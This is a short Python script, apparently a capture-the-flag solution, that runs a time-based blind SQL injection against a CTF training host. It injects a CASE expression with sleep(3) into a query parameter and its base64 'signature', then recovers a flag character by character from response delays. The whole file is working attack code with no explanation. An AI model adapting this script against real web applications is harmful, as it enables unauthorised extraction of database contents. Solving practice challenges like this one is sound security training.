import requests
import re
import base64
import urllib.parse

ip = 'http://kslweb1.spb.ctf.su/sqli/time1/?query={}'

for num in range(1, 50):
	for sym in range(48, 125):
		query = 'flag, CASE 1 WHEN substring(flag,{},1)=\'{}\' THEN sleep(3) END FROM flag'.format(num, chr(sym))
		urlquery = urllib.parse.quote(query).replace('%20', '+')
		b64query = base64.b64encode(query.encode())

		fin_query = 'http://kslweb1.spb.ctf.su/sqli/time1/?query={}&sig_query={}'.format(urlquery, b64query.decode())

		sess = requests.Session()
		cook = {'COC': 'DSFDSFDFFLFGH'}
		src = sess.post(fin_query, cookies = cook)
		# print(src.elapsed.total_seconds())
		if src.elapsed.total_seconds() > 3:
			print(chr(sym))
			break

